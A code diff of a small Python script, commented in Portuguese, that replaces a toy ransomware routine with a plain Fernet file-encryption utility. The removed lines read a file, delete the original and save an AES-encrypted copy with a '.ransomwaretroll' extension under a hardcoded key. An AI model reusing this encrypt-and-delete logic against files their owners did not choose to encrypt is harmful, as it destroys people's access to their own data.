@@ -1,24 +1,31 @@
-import os
-import pyaes
+from cryptography.fernet import Fernet
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# Função para gerar uma chave de criptografia e salvá-la em um arquivo
+def gerar_chave():
+    chave = Fernet.generate_key()
+    with open("chave_secreta.key", "wb") as arquivo_chave:
+        arquivo_chave.write(chave)
 
-## remover o arquivo
-os.remove(file_name)
+# Função para carregar a chave de criptografia
+def carregar_chave():
+    return open("chave_secreta.key", "rb").read()
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+# Função para criptografar um arquivo
+def criptografar_arquivo(nome_arquivo, chave):
+    fernet = Fernet(chave)
+    with open(nome_arquivo, "rb") as arquivo:
+        dados = arquivo.read()
+    dados_criptografados = fernet.encrypt(dados)
+    with open(nome_arquivo, "wb") as arquivo_criptografado:
+        arquivo_criptografado.write(dados_criptografados)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+# Exemplo de uso
+if __name__ == "__main__":
+    # Gerar e salvar a chave
+    gerar_chave()
+    chave = carregar_chave()
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+    # Criptografar um arquivo de exemplo
+    arquivo_para_criptografar = "teste.txt"  # Substitua pelo nome do seu arquivo
+    criptografar_arquivo(arquivo_para_criptografar, chave)
+    print(f"Arquivo '{arquivo_para_criptografar}' criptografado com sucesso!")
